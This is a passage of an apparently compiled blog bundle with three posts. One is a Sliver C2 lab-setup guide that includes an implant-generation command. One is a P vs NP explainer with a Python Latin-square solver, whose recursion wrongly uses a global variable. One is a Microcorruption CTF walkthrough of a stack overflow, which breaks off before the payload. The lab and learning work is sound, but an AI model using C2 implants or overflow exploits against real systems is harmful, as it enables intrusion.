<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var A=a(i,6);n(A,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sliver</span><span style="color:#E6EDF3">> </span><span style="color:#A5D6FF">generate</span><span style="color:#79C0FF"> --http</span><span style="color:#79C0FF"> 127.0.0.1</span><span style="color:#79C0FF"> --save</span><span style="color:#A5D6FF"> /home/vboxuser/Downloads</span><span style="color:#79C0FF"> --debug</span><span style="color:#79C0FF"> --os</span><span style="color:#A5D6FF"> linux</span></span></code></pre>'),g(e,s)}const fa=Object.freeze(Object.defineProperty({__proto__:null,default:Is,metadata:Ts},Symbol.toStringTag,{value:"Module"})),qs={title:"Creating a Sliver C2 Lab Environment",date:"2025-02-11T00:00:00",description:"Creation of a sliver c2 lab environment for testing and bug hunting",categories:["sliver","c2"]};var Ms=B("<p>In the past half a year, I have been using sliver, a c2 framework. In this article I am going to be demonstrating how to set up a sliver server instance from the source code to examine its internals in later articles. I also want to note that this will be getting the master version of sliver. THIS IS NOT A RELEASE BRANCH, and should not be used in production. Don’t follow this guide if you are trying to set up a sliver instance for production.</p> <p>I have the following objectives for this article:</p> <ul><li>Document how to install sliver from scratch on a fresh Ubuntu box.</li> <li>Document how to start the sliver server</li> <li>Document how to start sliver clients</li></ul> <p>First and foremost sliver is written in Go. Therefore the first thing we need to do is install golang:</p> <!> <p>We also will need several dependencies for sliver.</p> <!> <p>Now we can clone the sliver repository.</p> <!> <p>And then finally compile it:</p> <!> <p>This make will take a while. It is important that every time we make code changes, we redo this make.</p> <p>Once this is completed we can run a sliver server instance simply by typing</p> <!> <p>Most commands can be done from the sliver server, however if multiple people need to access our instance we should use sliver clients. To set up a client we need to generate a client config file. Within the sliver-server run the following command editing as needed:</p> <!> <p>Now we can run a client</p> <!>",1);function Rs(e){var s=Ms(),l=a(b(s),8);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> apt-get</span><span style="color:#A5D6FF"> update</span></span>
<span class="line"><span style="color:#8B949E"># snap grabs latest version (1.23), whereas apt installs 1.18 which is not a high enough version for sliver1.6>=1.21</span></span>
<span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> snap</span><span style="color:#A5D6FF"> install</span><span style="color:#A5D6FF"> go</span><span style="color:#79C0FF"> --classic</span><span style="color:#79C0FF"> --channel</span><span style="color:#A5D6FF"> stable</span></span></code></pre>`);var o=a(l,4);n(o,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> apt</span><span style="color:#A5D6FF"> install</span><span style="color:#A5D6FF"> git</span><span style="color:#A5D6FF"> make</span><span style="color:#A5D6FF"> sed</span><span style="color:#A5D6FF"> zip</span><span style="color:#A5D6FF"> curl</span><span style="color:#A5D6FF"> tar</span><span style="color:#79C0FF"> -y</span></span></code></pre>');var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">git</span><span style="color:#A5D6FF"> clone</span><span style="color:#A5D6FF"> https://github.com/BishopFox/sliver.git</span></span>
<span class="line"><span style="color:#79C0FF">cd</span><span style="color:#A5D6FF"> sliver</span></span></code></pre>`);var t=a(p,4);n(t,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">make</span></span></code></pre>');var r=a(t,6);n(r,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">./sliver-server</span></span></code></pre>');var c=a(r,4);n(c,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sliver</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> new-operator</span><span style="color:#79C0FF"> --name</span><span style="color:#A5D6FF"> user1</span><span style="color:#79C0FF"> --lhost</span><span style="color:#79C0FF"> 127.0.0.1</span><span style="color:#79C0FF"> --permissions</span><span style="color:#A5D6FF"> all</span><span style="color:#79C0FF"> --save</span><span style="color:#A5D6FF"> /home/vboxuser/.sliver-client/configs/</span></span>
<span class="line"><span style="color:#FFA657">sliver</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> multiplayer</span></span></code></pre>`);var y=a(c,4);n(y,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">cd</span><span style="color:#A5D6FF"> ~/sliver</span></span>
<span class="line"><span style="color:#FFA657">./sliver-client</span></span></code></pre>`),g(e,s)}const Ca=Object.freeze(Object.defineProperty({__proto__:null,default:Rs,metadata:qs},Symbol.toStringTag,{value:"Module"})),Hs={title:"Latin Squares and P vs NP",date:"2025-03-01T01:00:00",description:"Brief summary of what P = NP is and how it relates to Latin Squares",categories:["latin-squares","np-complete","p=np"]};var Os=B("<p>Before we can even get to Latin Squares, we need to talk about what P vs NP actually means.</p> <p>A little bit of background:</p> <p>As with everything in Computer Science, we care about how fast a problem can be solved. We have classifications of problems and importantly for P vs NP we care about decision problems. Decision problems are problems where given an input, the solution can be reduced to either yes or no.</p> <p>Secondly, we have to talk about Turing machines. Turing machines are an abstraction of a computer that can be modeled mathematically. This abstraction is able to model any computer algorithm. There is a lot to Turing machines, and I encourage anyone interested in Computer Science to learn more about them. For our purposes, we care about the difference between a deterministic Turing machine and a non-deterministic Turing Machine.</p> <p>The simplified difference between these two is the manor in which they solve problems. A deterministic Turing machine has one action that can be performed at any one state, whereas a non-deterministic Turing machine allows for multiple actions to be performed from a state. You may see deterministic machines referred to having a computational path while non-deterministic machines referred to having a computational tree. Importantly for us, for any one step, there is only one next step in a deterministic Turing machine.</p> <p>Thirdly, we need to talk about polynomial time. In big O notation, polynomial time would loosely be the set of equations where n is raised to a power (a polynomial). ie: O(n<sup>x</sup>) where x is an integer. So O(n<sup>2</sup> + 3n) is polynomial time.</p> <p>When n becomes the exponent we are now in “exponential” time. So O(x<sup>n</sup>) for some integer x, is not polynomial time. So for the common types of Big O notations we can draw the line between these two.</p> <b>Big Os</b>: <br> Constant    - O(1) <br> Logarithmic - O(log n) <br> Loglinear   - O(n log n) <br> Polynomial  - O(n^x) <br> ----------------------------- Where we draw the line. <br> Exponential - O(x^n) <br> Factorial   - O(n!) <br> <br> <p>Given all this, P and NP refer to two decision problem sets.</p> <ul><li><b>P</b> is the set of decision problems that can be <b>solved</b> in polynomial time (by a deterministic Turing machine).</li> <li><b>NP</b> is the set of decision problems that can <b>verified</b> in polynomial time (by a deterministic Turing machine).</li></ul> <p>So what NP = P is actually asking is: Are the problems that can be verified in polynomial time also the problems that can be solved in polynomial time?</p> <p>The general consensus is that P != NP. This is a good thing as almost all of our encryption relies on one way functions which are dependant on P != NP.</p> <p>So what does this have to do with Latin Squares? Latin Square Completion is a NP-Complete problem. NP-Complete problems are problems where if you can figure out how to solve them in polynomial time, you can solve all other NP problems in polynomial time.</p> <h2>Solving Latin Squares</h2> <p>Solving incomplete Latin Squares is a pretty typical question during coding events. I whipped up the following solution today with some comments, so that you can look through it. As you can see, this is definitely not polynomial time.</p> <!>",1);function js(e){var s=Os(),l=a(b(s),48);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#A5D6FF">Determines a spot in a matrix that we have the most information about. </span></span>
<span class="line"><span style="color:#A5D6FF">ie: has the most elements filled next to it in its column and row.</span></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> find_most_known_spot</span><span style="color:#E6EDF3">(latin_square):</span></span>
<span class="line"><span style="color:#8B949E">    # calculate weight matrix (heuristic solving)</span></span>
<span class="line"><span style="color:#E6EDF3">    known_squares_rows </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> len</span><span style="color:#E6EDF3">(latin_square)</span></span>
<span class="line"><span style="color:#E6EDF3">    known_squares_columns </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> len</span><span style="color:#E6EDF3">(latin_square[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">])</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> i </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square)): </span><span style="color:#8B949E"># iterate through each element and add weight to the row and column it is in</span></span>
<span class="line"><span style="color:#FF7B72">        for</span><span style="color:#E6EDF3"> j </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square[i])):</span></span>
<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#E6EDF3">(latin_square[i][j] </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">):</span></span>
<span class="line"><span style="color:#E6EDF3">                known_squares_columns[j] </span><span style="color:#FF7B72">+=</span><span style="color:#79C0FF"> 1</span></span>
<span class="line"><span style="color:#E6EDF3">                known_squares_rows[i] </span><span style="color:#FF7B72">+=</span><span style="color:#79C0FF"> 1</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">    max_loc </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">-</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">,</span><span style="color:#FF7B72">-</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">] </span><span style="color:#8B949E"># first location we will choose, init to -1 so as not to replace an already filled value</span></span>
<span class="line"><span style="color:#79C0FF">    max</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> -</span><span style="color:#79C0FF">1</span></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> i </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square)):</span></span>
<span class="line"><span style="color:#FF7B72">        for</span><span style="color:#E6EDF3"> j </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square[i])):</span></span>
<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#E6EDF3">(latin_square[i][j] </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">):</span></span>
<span class="line"><span style="color:#E6EDF3">                tmp </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> known_squares_columns[j] </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> known_squares_rows[i]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">max</span><span style="color:#FF7B72"> ==</span><span style="color:#FF7B72"> -</span><span style="color:#79C0FF">1</span><span style="color:#FF7B72"> or</span><span style="color:#E6EDF3"> tmp </span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> max</span><span style="color:#E6EDF3">): </span><span style="color:#8B949E"># if most information about this square set it to the max</span></span>
<span class="line"><span style="color:#E6EDF3">                    max_loc </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [i, j]</span></span>
<span class="line"><span style="color:#79C0FF">                    max</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> tmp</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> max_loc</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#A5D6FF">determines the numbers that are available to be placed into a location</span></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> find_choices_for_loc</span><span style="color:#E6EDF3">(latin_square, loc):</span></span>
<span class="line"><span style="color:#E6EDF3">    variables </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [i </span><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> i </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">,</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square)</span><span style="color:#FF7B72">+</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)] </span><span style="color:#8B949E"># create a list of available variables</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> row </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">len</span><span style="color:#E6EDF3">(latin_square)): </span><span style="color:#8B949E"># for the rows in latin square</span></span>
<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3">(latin_square[row][loc[</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">]] </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> variables): </span><span style="color:#8B949E"># check if element at column is in variables</span></span>
<span class="line"><span style="color:#E6EDF3">            variables.remove(latin_square[row][loc[</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">]]) </span><span style="color:#8B949E"># if so remove it</span></span>
<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3">(row </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> loc[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]): </span><span style="color:#8B949E"># check row is equal to location's row</span></span>
<span class="line"><span style="color:#FF7B72">            for</span><span style="color:#E6EDF3"> col </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> latin_square[row]: </span><span style="color:#8B949E"># iterate through this row and remove all matching variables</span></span>
<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3">(col </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> variables):</span></span>
<span class="line"><span style="color:#E6EDF3">                    variables.remove(col)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">    </span></span>
<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> variables</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#A5D6FF">Checks if a latin square is solved</span></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> is_solved</span><span style="color:#E6EDF3">(latin_square):</span></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> row </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> latin_square:</span></span>
<span class="line"><span style="color:#FF7B72">        for</span><span style="color:#E6EDF3"> col </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> row:</span></span>
<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#E6EDF3">(col </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">):  </span><span style="color:#8B949E"># if any location is empty (0), then the square cannot be solved</span></span>
<span class="line"><span style="color:#FF7B72">                return</span><span style="color:#79C0FF"> False</span></span>
<span class="line"><span style="color:#E6EDF3">            </span></span>
<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> True</span><span style="color:#8B949E"> # if everything is full, then we must be solved</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#A5D6FF">Solves a partially complete latin square</span></span>
<span class="line"><span style="color:#A5D6FF">"""</span></span>
<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> solve</span><span style="color:#E6EDF3">(latin_square):</span></span>
<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3">(is_solved(latin_square)): </span><span style="color:#8B949E"># base case</span></span>
<span class="line"><span style="color:#79C0FF">        print</span><span style="color:#E6EDF3">(latin_square) </span><span style="color:#8B949E"># let the people know</span></span>
<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#79C0FF"> True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#79C0FF">    max</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> find_most_known_spot(latin_square) </span><span style="color:#8B949E"># find the most optimal place to make a choice</span></span>
<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> x </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> find_choices_for_loc(ls, </span><span style="color:#79C0FF">max</span><span style="color:#E6EDF3">): </span></span>
<span class="line"><span style="color:#E6EDF3">        latin_square[</span><span style="color:#79C0FF">max</span><span style="color:#E6EDF3">[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]][</span><span style="color:#79C0FF">max</span><span style="color:#E6EDF3">[</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">]] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> x</span></span>
<span class="line"><span style="color:#E6EDF3">        </span></span>
<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3">(solve(latin_square)):</span></span>
<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#79C0FF"> True</span></span>
<span class="line"><span style="color:#E6EDF3">        </span></span>
<span class="line"><span style="color:#E6EDF3">        latin_square[</span><span style="color:#79C0FF">max</span><span style="color:#E6EDF3">[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]][</span><span style="color:#79C0FF">max</span><span style="color:#E6EDF3">[</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">]] </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 0</span><span style="color:#8B949E"> # reset the matrix as it was not solvable with the current choice</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#8B949E"># example matrix</span></span>
<span class="line"><span style="color:#E6EDF3">ls </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span></span>
<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">3</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">],</span></span>
<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">],</span></span>
<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">2</span><span style="color:#E6EDF3">],</span></span>
<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#79C0FF">4</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">],</span></span>
<span class="line"><span style="color:#E6EDF3">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">solve(ls)</span></span></code></pre>`),g(e,s)}const ma=Object.freeze(Object.defineProperty({__proto__:null,default:js,metadata:Hs},Symbol.toStringTag,{value:"Module"})),Ns={title:"Microcorruption Cusco",date:"2025-02-04T04:00:00",description:"The process and solution for the fourth Microcorruption level",categories:["microcorruption","reversing","pwn"]};var Ls=B('<p>As always here is the manual for Microcorruption:</p> <ul><li>Manual: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a></li></ul> <p>Additionally, the MSP430 specific booklets:</p> <ul><li>User Guide: <a href="https://www.ti.com/lit/ug/slau049f/slau049f.pdf" rel="nofollow">https://www.ti.com/lit/ug/slau049f/slau049f.pdf</a></li> <li>ABI: <a href="https://www.ti.com/lit/an/slaa534a/slaa534a.pdf" rel="nofollow">https://www.ti.com/lit/an/slaa534a/slaa534a.pdf</a></li></ul> <p>Looking at the program, again the main simply calls the login function, so lets analyze login.</p> <!> <p>At first glance it looks like we make be able to cause a stack overflow. We are able to write an arbitrary amount of data to the stack. Because programs store their return address on the stack, lets try and overflow this return address.</p> <p>First we need the address of the function we want to jump into. Lets use the unlock door function at address 4446.</p> <!> <p>Next we need to figure out how far into the stack we need to exploit. We can calculate this by hand, but it is easier to generate a pattern. I used the following site: <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html" rel="nofollow">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a></p> <!> <p>We can then run the program with a breakpoint at 0x453e.</p> <!> <p>From this we see the 0Ab1 is loaded in memory at the stack pointer.</p> <!> <p>Plugging this in we find the return address offset is 32. Using the offset and the address 4446 lets attempt to exploit this. Remembering that data is loaded in little endian:</p> <!> <p>Submitting this, remembering to check the box for hex, solves the puzzle.</p>',1);function zs(e){var s=Ls(),l=a(b(s),10);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#8B949E">                                      ; allocate space on the stack (16 decimal in this case) because of the overflow</span></span>
<span class="line"><span style="color:#79C0FF">4504</span><span style="color:#E6EDF3">:  3f40 7c44      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x447c</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">   ; </span></span>
<span class="line"><span style="color:#79C0FF">4508</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                   </span><span style="color:#8B949E">; print the above string</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">450c:</span><span style="color:#E6EDF3">  3f40 9c44      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x449c</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">     ; </span></span>
<span class="line"><span style="color:#79C0FF">4510</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                   </span><span style="color:#8B949E">; print the above string</span></span>
<span class="line"><span style="color:#79C0FF">4514</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 3000</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x30</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">                                       ; set the value of r14 to 0x30</span></span>
<span class="line"><span style="color:#79C0FF">4518</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                          ; move the stack pointer into r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">9645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4596</span><span style="color:#E6EDF3"> &#x3C;getsn>                                  </span><span style="color:#8B949E">; getsn will output user data at address of r15 (or onto the stack)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451e:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                          ; reset r15 to the location of the stack</span></span>
<span class="line"><span style="color:#79C0FF">4520</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">5244</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4452</span><span style="color:#E6EDF3"> &#x3C;test_password_valid>                    </span></span>
<span class="line"><span style="color:#79C0FF">4524</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">                                             </span></span>
<span class="line"><span style="color:#79C0FF">4526</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0524</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x32</span><span style="color:#E6EDF3">>                               </span></span>
<span class="line"><span style="color:#79C0FF">4528</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">4644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4446</span><span style="color:#E6EDF3"> &#x3C;unlock_door>                           </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452c:</span><span style="color:#E6EDF3">  3f40 d144      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d1</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">                  </span></span>
<span class="line"><span style="color:#79C0FF">4530</span><span style="color:#E6EDF3">:  023c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x36</span><span style="color:#E6EDF3">>                              </span></span>
<span class="line"><span style="color:#79C0FF">4532</span><span style="color:#E6EDF3">:  3f40 e144      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44e1</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">    </span></span>
<span class="line"><span style="color:#79C0FF">4536</span><span style="color:#E6EDF3">:  b012 a645      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a6</span><span style="color:#E6EDF3"> &#x3C;puts>                                  </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453a:</span><span style="color:#79C0FF">  3150</span><span style="color:#79C0FF"> 1000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">                                       </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#E6EDF3">                                                   </span></span></code></pre>`);var o=a(l,6);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3"> &#x3C;unlock_door></span></span>
<span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 7f00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7f</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">4245</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4542</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444e:</span><span style="color:#79C0FF">  2153</span><span style="color:#E6EDF3">           incd	</span><span style="color:#79C0FF">sp</span></span>
